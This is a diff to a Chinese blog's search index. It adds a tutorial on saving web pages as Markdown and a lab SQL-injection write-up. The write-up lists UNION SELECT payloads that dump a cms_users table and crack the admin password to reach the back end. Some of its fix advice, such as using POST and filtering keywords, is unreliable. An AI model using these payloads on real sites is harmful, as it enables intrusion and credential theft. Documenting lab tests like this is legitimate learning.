@@ -4,13 +4,75 @@
   
     
     <entry>
+      <title>把任何教程网页下载成md文档？转为pdf？一篇就够了</title>
+      <link href="/2024/07/25/%E6%8A%8A%E4%BB%BB%E4%BD%95%E6%95%99%E7%A8%8B%E7%BD%91%E9%A1%B5%E4%B8%8B%E8%BD%BD%E6%88%90md%E6%96%87%E6%A1%A3%EF%BC%9F%E8%BD%AC%E4%B8%BApdf%EF%BC%9F%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/"/>
+      <url>/2024/07/25/%E6%8A%8A%E4%BB%BB%E4%BD%95%E6%95%99%E7%A8%8B%E7%BD%91%E9%A1%B5%E4%B8%8B%E8%BD%BD%E6%88%90md%E6%96%87%E6%A1%A3%EF%BC%9F%E8%BD%AC%E4%B8%BApdf%EF%BC%9F%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/</url>
+      
+        <content type="html"><![CDATA[<p><code>2023年7月23日 添加目录</code></p><h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><ul><li><ul><li><ul><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#1__14">1 需要先下载一个插件</a></li><li><ul><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#11__20">1.1 在最上面的工具栏部分找到扩展</a></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#12_Microsoft_Edge_24">1.2 在左边的搜索框部分选择获取Microsoft Edge扩展</a></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#13__29">1.3 直接搜索</a></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#14__34">1.4 安装就行了，我这里安过了，所以显示删除</a></li></ul></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#2__41">2 找到一个你喜欢的网页</a></li><li><ul><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#21__45">2.1 这里找到网页之后，在网页上右键找到该插件</a></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#22_Download_Tab_As_Markdown_52">2.2 子菜单里面选一下，一般用Download Tab As Markdown</a></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#23_md_57">2.3 会下载为md文档</a></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#24_TyporaMarkdown_62">2.4 可以直接用Typora等Markdown文档编辑软件打开</a></li></ul></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#3_pdf_66">3 转为pdf</a></li><li><ul><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#31_Markdownpdf_70">3.1 用在线Markdown文档转pdf网页</a></li><li><a href="https://blog.csdn.net/weixin_54878983/article/details/131876809#32_TyporaMarkdownpdf_78">3.2 利用Typora等Markdown文档编辑软件导出为pdf就行</a></li></ul></li></ul></li></ul></li></ul><h4 id="1-需要先下载一个插件"><a href="#1-需要先下载一个插件" class="headerlink" title="1 需要先下载一个插件"></a>1 需要先下载一个插件</h4><p>一个超级好用的插件MarkDownload - <a href="https://so.csdn.net/so/search?q=Markdown&spm=1001.2101.3001.7020">Markdown</a> Web Clipper</p><p>直接在浏览器扩展里找，手机党需要一个支持js插件的浏览器，<a href="https://so.csdn.net/so/search?q=%E7%81%AB%E7%8B%90&spm=1001.2101.3001.7020">火狐</a>什么的。</p><h5 id="1-1-在最上面的工具栏部分找到扩展"><a href="#1-1-在最上面的工具栏部分找到扩展" class="headerlink" title="1.1 在最上面的工具栏部分找到扩展"></a>1.1 在最上面的工具栏部分找到扩展</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b810f472cddd2855994f0f0be8daa784.png" alt="在这里插入图片描述"></p><h5 id="1-2-在左边的搜索框部分选择获取Microsoft-Edge扩展"><a href="#1-2-在左边的搜索框部分选择获取Microsoft-Edge扩展" class="headerlink" title="1.2 在左边的搜索框部分选择获取Microsoft Edge扩展"></a>1.2 在左边的搜索框部分选择获取Microsoft Edge扩展</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6ce63b740b84c1da701aa5eb47a0ab35.png" alt="在这里插入图片描述"></p><h5 id="1-3-直接搜索"><a href="#1-3-直接搜索" class="headerlink" title="1.3 直接搜索"></a>1.3 直接搜索</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5f0067e173f306bf68844c49e04fa6ae.png" alt="在这里插入图片描述"></p><h5 id="1-4-安装就行了，我这里安过了，所以显示删除"><a href="#1-4-安装就行了，我这里安过了，所以显示删除" class="headerlink" title="1.4 安装就行了，我这里安过了，所以显示删除"></a>1.4 安装就行了，我这里安过了，所以显示删除</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90ee6fe048bff78f60870272fac0a21a.png" alt="在这里插入图片描述"></p><h4 id="2-找到一个你喜欢的网页"><a href="#2-找到一个你喜欢的网页" class="headerlink" title="2 找到一个你喜欢的网页"></a>2 找到一个你喜欢的网页</h4><p><strong>我经常用来保存网页上的教程为Markdown，不仅可以直接用软件编辑，还能转pdf到手机或者平板上看。</strong></p><h5 id="2-1-这里找到网页之后，在网页上右键找到该插件"><a href="#2-1-这里找到网页之后，在网页上右键找到该插件" class="headerlink" title="2.1 这里找到网页之后，在网页上右键找到该插件"></a>2.1 这里找到网页之后，在网页上右键找到该插件</h5><p>如果没找到，就看一下扩展里面是否启用了插件</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/37b9cc35191b8bf272f503be49680fe8.png" alt="在这里插入图片描述"></p><h5 id="2-2-子菜单里面选一下，一般用Download-Tab-As-Markdown"><a href="#2-2-子菜单里面选一下，一般用Download-Tab-As-Markdown" class="headerlink" title="2.2 子菜单里面选一下，一般用Download Tab As Markdown"></a>2.2 子菜单里面选一下，一般用Download Tab As Markdown</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8c8729caa2477682d6d1850f008e1962.png" alt="在这里插入图片描述"></p><h5 id="2-3-会下载为md文档"><a href="#2-3-会下载为md文档" class="headerlink" title="2.3 会下载为md文档"></a>2.3 会下载为md文档</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/2fcffcfe589004217502f328f0e3f69a.png" alt="在这里插入图片描述"></p><h5 id="2-4-可以直接用Typora等Markdown文档编辑软件打开"><a href="#2-4-可以直接用Typora等Markdown文档编辑软件打开" class="headerlink" title="2.4 可以直接用Typora等Markdown文档编辑软件打开"></a>2.4 可以直接用Typora等Markdown文档编辑软件打开</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f648209081c61d634e718ad969902993.png" alt="在这里插入图片描述"></p><h4 id="3-转为pdf"><a href="#3-转为pdf" class="headerlink" title="3 转为pdf"></a>3 转为pdf</h4><p>一般有两种手段</p><h5 id="3-1-用在线Markdown文档转pdf网页"><a href="#3-1-用在线Markdown文档转pdf网页" class="headerlink" title="3.1 用在线Markdown文档转pdf网页"></a>3.1 用在线Markdown文档转pdf网页</h5><p><a href="https://www.easeconvert.com/markdown-to-pdf/">Markdown转PDF - 在线免费将Markdown转换成PDF文件 - 易转换 (easeconvert.com)</a></p><p>没有广告费，这玩意是真好用，在首页啥格式都能转，问题还免费。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4046e301990da29a8f3114170c83b520.png" alt="在这里插入图片描述"></p><h5 id="3-2-利用Typora等Markdown文档编辑软件导出为pdf就行"><a href="#3-2-利用Typora等Markdown文档编辑软件导出为pdf就行" class="headerlink" title="3.2 利用Typora等Markdown文档编辑软件导出为pdf就行"></a>3.2 利用Typora等Markdown文档编辑软件导出为pdf就行</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/48d3ab739ff39e390b328c9d58c727f1.png" alt="在这里插入图片描述"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> html </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> md </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>记录我的第一次渗透测试</title>
+      <link href="/2024/07/25/%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+      <url>/2024/07/25/%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+      
+        <content type="html"><![CDATA[<h2 id="SQL注入漏洞挖掘报告"><a href="#SQL注入漏洞挖掘报告" class="headerlink" title="SQL注入漏洞挖掘报告"></a>SQL注入漏洞挖掘报告</h2><p>漏洞挖掘环境<br>角色操作系统IP地址<br>攻击机Kali Linux 192.168.232.129<br>靶机Windows Serve 2008192.168.232.131<br>漏洞挖掘使用工具<br>工具名称作用<br>SQLMap自动化SQL注入<br>BurpsuiteWeb抓包</p><p>漏洞页面     <a href="http://192.168.232.131/cms/show.php?id=32">http://192.168.232.131/cms/show.php?id=32</a><br>SQL注入字段 id<br>漏洞类型     联合查询类SQL注入漏洞<br>漏洞挖掘过程<br> 1.寻找SQL注入点 在URL后加入单引号测试；</p><p>2.确认注入点的类型（是数字型）</p><p>3.猜解当前页面查询的字段总数<br>在URL后加上 order by 1，并逐步加大数直到报错为止，报错的上一个数字就是字段总数</p><p>一共15个字段</p><p>4.查询当前页面中显示了哪几个字段在URL后加上<br> ‘<br> and 1&#x3D;2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15<br> ‘</p><p>5.查询当前网站数据库的名称在URL后加上<br>and 1&#x3D;2 union select 1,2,3,4,5,6,7,8,database(),10,11,12,13,14,15</p><p>6.查询当前数据库中所有表的名称<br>‘and 1&#x3D;2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,group_concat(table_name),15 from information_schema.tables where table_schema&#x3D;database()’</p><p>7.查询指定表中所有字段名称：<br>‘<br>and 1&#x3D;2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,group_concat(column_name),15 from information_schema.columns where table_name&#x3D;’cms_users’<br>‘</p><p>8.查询表中username和password内容<br>‘<br>and 1&#x3D;2 union select 1,2,3,4,5,6,7,8,9,10,11,username,13,password,15 from cms_users<br>‘<br>爆破出用户名为admin，由于密码是加密的，使用cmd5.com解析密码</p><p>爆破出密码为123456<br>使用该账号密码进入后台管理验证成功进入后台</p><p>成功进入后台</p><p>漏洞修补建议|1.尽量使用POST方式去传递数据</p><pre><code>        |2.过滤敏感字符像单引号，双引号、#、and 1=1、or 1=1、union、order by等数据库语言        |3.使用PDO防护        |4.前后端分离</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 ，网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>第一篇文章</title>
       <link href="/2024/07/24/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
       <url>/2024/07/24/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
       
-        <content type="html"><![CDATA[<h2 id="这是我的第一篇文章"><a href="#这是我的第一篇文章" class="headerlink" title="这是我的第一篇文章"></a>这是我的第一篇文章</h2>]]></content>
+        <content type="html"><![CDATA[<h2 id="这是我的第一篇文章"><a href="#这是我的第一篇文章" class="headerlink" title="这是我的第一篇文章"></a>这是我的第一篇文章</h2><p>这个文章仅仅作为演示作用<br>来看看博客样式谢谢！！</p>]]></content>
       
       
+      <categories>
+          
+          <category> 演示 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中文 </tag>
+            
+        </tags>
       
     </entry>
     
